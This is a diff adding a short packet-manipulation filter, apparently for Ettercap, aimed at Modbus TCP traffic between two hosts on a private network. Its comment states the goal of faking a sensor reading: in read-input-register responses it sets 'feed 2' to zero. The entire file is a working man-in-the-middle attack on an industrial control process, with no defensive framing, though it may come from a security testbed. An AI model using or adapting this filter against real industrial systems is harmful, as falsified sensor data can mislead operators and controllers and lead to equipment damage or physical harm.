@@ -1,0 +1,9 @@
+# manipulate feed 2 sensor reading to 0
+
+if (ip.src == '192.168.95.11' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+
+	DATA.data + 11 = 0x00;
+        DATA.data + 12 = 0x00;
+    }
+}
